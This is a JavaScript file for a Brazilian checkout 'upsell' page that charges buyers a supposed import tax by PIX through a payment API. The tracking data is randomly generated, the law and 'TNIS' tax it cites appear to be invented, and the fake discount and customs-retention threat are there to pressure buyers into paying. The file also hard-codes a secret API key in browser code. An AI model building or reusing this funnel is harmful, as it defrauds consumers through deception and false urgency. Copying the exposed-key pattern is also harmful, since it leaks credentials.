/* Upsell Step 1: Taxa de Importação — integrado com Flevopay */

const FLEVO_CONFIG_U1 = {
  endpoint: 'https://app.flevopay.com.br/api/v1/transaction',
  apiKey: 'sk_c1a9352aad997014b44aafa2609fb65ad38ad96e025b770166cb545a92fb04d9',
  productHash: 'prod_10b3a75f467b0a11'
};

;(function () {
  const AMOUNT_REAIS = 'R$ 31,53'

  const id      = qs('id', '')
  const content = document.getElementById('up-content')

  let productName = 'Produto'
  try { const s = localStorage.getItem('last_order_product'); if (s) productName = s } catch {}

  let customer = null
  try { customer = JSON.parse(localStorage.getItem('pdap-customer') || 'null') } catch {}

  const orderNumber  = '#BR-2024-' + Math.floor(1000000 + Math.random() * 9000000)
  const trackingCode = 'BR' + Math.floor(100000 + Math.random() * 900000) + 'PL'

  /* PIX do upsell */
  let upsellId   = null
  let pixCode    = null
  let pixQrUrl   = null
  let pollTimer  = null
  let pollCount  = 0

  function nextPage() {
    clearInterval(pollTimer)
    location.href = `obrigado-2.html?id=${encodeURIComponent(id)}`
  }

  /* Se este step já foi pago nesta sessão, vai direto para o próximo */
  try { if (localStorage.getItem('pdap-upsell1-paid-' + id)) { nextPage(); return } } catch {}

  /* ── Geração do PIX real ── */
  async function criarPixUpsell() {
    if (!customer) {
      /* Sem dados do cliente (ex: acesso direto) → avança sem upsell */
      nextPage()
      return
    }
    try {
      const resp = await fetch(FLEVO_CONFIG_U1.endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': FLEVO_CONFIG_U1.apiKey
        },
        body: JSON.stringify({
          amount: 3153,
          description: 'Taxa de Importação Aduaneira - ' + productName,
          reference: 'UPS1-' + (id || Date.now()) + '-' + Math.random().toString(36).slice(2, 6),
          productHash: FLEVO_CONFIG_U1.productHash,
          customer: {
            name: customer.name || 'Cliente',
            email: customer.email || 'cliente@email.com',
            phone: customer.phone || '11999999999',
            document: customer.document || '00000000000'
          },
          tracking: {
            utm_source: 'tiktok',
            utm_campaign: 'upsell-1'
          }
        })
      })
      const data = await resp.json()
      if (!resp.ok || data.error || data.status === 'error') throw new Error(data.error || data.message || 'Erro ao gerar PIX do upsell')
      
      upsellId = data.transaction_id || data.id
      pixCode  = data.qr_code || data.pixCode
      pixQrUrl = data.qr_code_base64 || data.pixQrCode || `https://api.qrserver.com/v1/create-qr-code/?size=192x192&margin=0&data=${encodeURIComponent(pixCode)}`
      renderPix()
    } catch (e) {
      console.warn('Erro upsell PIX:', e.message)
      renderPix(true)
    }
  }

  async function checkUpsellPayment() {
    if (!upsellId || pollCount++ > 120) { clearInterval(pollTimer); return }
    try {
      const resp = await fetch(
        `${_EDGE_U1}/check-payment?orderId=${encodeURIComponent(upsellId)}&type=upsell`,
        { headers: { Authorization: `Bearer ${_ANON_U1}` } }
      )
      if (!resp.ok) return
      const data = await resp.json()
      if (data.status === 'paid') renderPaid()
    } catch {}
  }

  /* ── Renderizações ── */
  function renderTracking() {
    content.innerHTML = `
      <div class="track-card">
        <div class="track-head">
          <div class="track-icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
          </div>
          <div class="track-info">
            <div class="name">${escapeHtml(productName)}</div>
            <div class="order">Pedido: ${orderNumber}</div>
            <div class="code"><span>📋</span><span>${trackingCode}</span></div>
          </div>
        </div>
        <div class="track-status"><span class="badge-transit">Em Trânsito</span></div>
        <div class="track-origin">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg>
          <span>Origem: Paraguai • Destino: Brasil • Transportadora: International Express</span>
        </div>
      </div>

      <div class="steps-row">
        <div class="step-cell"><div class="step-pill done"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> 1</div><div class="step-label">Pedido</div></div>
        <div class="step-cell"><div class="step-pill done"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> 2</div><div class="step-label">Separação</div></div>
        <div class="step-cell"><div class="step-pill idle">⏳ 3</div><div class="step-label">Envio</div></div>
        <div class="step-cell"><div class="step-pill error">✕ 4</div><div class="step-label">Entrega</div></div>
      </div>

      <div class="warn-box">
        <div class="warn-head">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
          <div><div class="t1">IMPORTANTE</div><div class="t2">Pendência identificada no seu pedido</div></div>
        </div>
        <div class="warn-body">
          <p>O produto que você selecionou é importado e durante o processo de separação e envio foi identificada uma taxa obrigatória de desembaraço aduaneiro.</p>
          <p>De acordo com a Lei Federal nº 14.985/2025, toda mercadoria de origem internacional está sujeita à Taxa Nacional de Importação Simplificada (TNIS).</p>
          <button type="button" class="btn-calc" id="btn-calc"><span>⟳</span> Calcular Taxa</button>
        </div>
      </div>`
    document.getElementById('btn-calc').addEventListener('click', renderCalculated)
  }

  function renderCalculated() {
    content.innerHTML = `
      <div class="track-card">
        <div class="track-head">
          <div class="track-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
          <div class="track-info">
            <div class="name">${escapeHtml(productName)}</div>
            <div class="order">Pedido: ${orderNumber}</div>
            <div class="code"><span>📋</span><span>${trackingCode}</span></div>
          </div>
        </div>
        <div class="track-status"><span class="badge-transit">Em Trânsito</span></div>
        <div class="track-origin">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg>
          <span>Origem: Paraguai • Destino: Brasil • Transportadora: International Express</span>
        </div>
      </div>
      <div class="steps-row">
        <div class="step-cell"><div class="step-pill done"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> 1</div><div class="step-label">Pedido</div></div>
        <div class="step-cell"><div class="step-pill done"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> 2</div><div class="step-label">Separação</div></div>
        <div class="step-cell"><div class="step-pill idle">⏳ 3</div><div class="step-label">Envio</div></div>
        <div class="step-cell"><div class="step-pill error">✕ 4</div><div class="step-label">Entrega</div></div>
      </div>
      <div class="calc-box">
        <div class="calc-inner">
          <div class="calc-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
          <div class="calc-title">Taxa Calculada com Sucesso!</div>
          <div class="calc-table">
            <div class="calc-row"><span class="lbl">Taxa de importação:</span><span class="old">R$ 197,00</span></div>
            <div class="calc-row"><span class="lbl disc">Valor com desconto:</span><span class="val">${AMOUNT_REAIS}</span></div>
          </div>
          <button type="button" class="btn-liberar" id="btn-liberar">Liberar Entrega</button>
        </div>
        <div class="calc-warn"><span>⚠ Atenção:</span> Caso você não pague a taxa, seu pedido pode ser retido na alfândega.</div>
      </div>`
    document.getElementById('btn-liberar').addEventListener('click', renderLoading)
  }

  function renderLoading() {
    content.innerHTML = `
      <div class="loader-box">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>
        <p>Gerando pagamento PIX...</p>
      </div>`
    criarPixUpsell()
  }

  function renderPix(erro) {
    if (!pixCode) { nextPage(); return }
    const qr = pixQrUrl || `https://api.qrserver.com/v1/create-qr-code/?size=192x192&margin=0&data=${encodeURIComponent(pixCode)}`
    content.innerHTML = `
      <div class="up-pix">
        <h2>Pague a taxa via PIX</h2>
        <p class="sub">Escaneie o QR Code ou copie o código para pagar</p>
        <div class="qr-wrap"><img src="${qr}" alt="QR Code PIX" width="192" height="192" /></div>
        <div class="amount">${AMOUNT_REAIS}</div>
        <p class="amount-sub">Pagamento via PIX • Aprovação instantânea</p>
        <div class="code-box">
          <div class="code-lbl">Código PIX Copia e Cola:</div>
          <div class="code-val">${escapeHtml(pixCode)}</div>
        </div>
        <button type="button" class="btn-copy" id="btn-copy-pix">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
          Copiar código PIX
        </button>
        <div class="pix-expiry">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
          <span>Este código expira em 30 minutos</span>
          <svg class="spin-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>
        </div>
      </div>`
    document.getElementById('btn-copy-pix').addEventListener('click', async () => {
      try {
        await navigator.clipboard.writeText(pixCode)
        const btn = document.getElementById('btn-copy-pix')
        btn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> Copiado!`
        setTimeout(() => {
          if (btn) btn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg> Copiar código PIX`
        }, 2500)
      } catch {}
    })
    /* Polling */
    if (upsellId) pollTimer = setInterval(checkUpsellPayment, 5000)
  }

  function renderPaid() {
    clearInterval(pollTimer)
    try { localStorage.setItem('pdap-upsell1-paid-' + id, '1') } catch {}
    /* Mesma trava de disparo único usada no caminho "já pago". */
    var _jaEnviado = false
    try { _jaEnviado = !!localStorage.getItem('pdap-upsell1-paid-' + id + '-sent') } catch {}
    if (!_jaEnviado) {
      if (typeof ttk !== 'undefined') ttk.upsellPurchase(1, 3153, upsellId)
      try { localStorage.setItem('pdap-upsell1-paid-' + id + '-sent', '1') } catch {}
    }
    content.innerHTML = `
      <div class="paid-box">
        <div class="paid-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg></div>
        <h2 style="font-size:1.125rem;font-weight:700;color:#111827;margin:0 0 .25rem;">Pagamento confirmado! 🎉</h2>
        <p style="font-size:.875rem;color:#6b7280;">Redirecionando...</p>
      </div>`
    setTimeout(nextPage, 1800)
  }

  /* TikTok CompletePayment — PIX principal foi pago */
  if (typeof ttk !== 'undefined') {
    var _orderData = null
    try { _orderData = JSON.parse(localStorage.getItem('pdap-order-' + id) || 'null') } catch {}
    var _cartItems = _orderData && Array.isArray(_orderData.cart)
      ? _orderData.cart.map(function(i){ return { id: i.name, name: i.name, quantity: i.quantity || 1 } })
      : []
    ttk.purchase(id, _orderData ? _orderData.amount_cents : 0, _cartItems, customer)
  }

  renderTracking()
})()
